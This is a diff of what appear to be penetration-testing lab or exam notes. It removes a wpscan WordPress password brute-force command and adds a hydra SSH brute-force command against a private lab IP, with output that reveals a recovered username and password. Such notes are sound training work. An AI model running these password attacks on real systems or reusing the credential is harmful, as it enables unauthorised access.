@@ -1,11 +1,21 @@
-wpscan --url http://192.168.104.112 \
-  -U administrator \
-  -P /usr/share/wordlists/rockyou.txt \
-  --password-attack xmlrpc-multicall
 
-http://192.168.104.112/wp-register.php
+```sh
+┌──(koshi㉿kali)-[~/Exam/Lucky]
+└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.104.112                    
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-23 10:35:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 80 login tries (l:8/p:10), ~5 tries per task
+[DATA] attacking ssh://192.168.104.112:22/
+[22][ssh] host: 192.168.104.112   login: sarah   password: !Password-Reset0000
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-23 10:36:32
+
+```
 
 
+![[Pasted image 20260223103717.png]]
 # Nmap
 
 ```
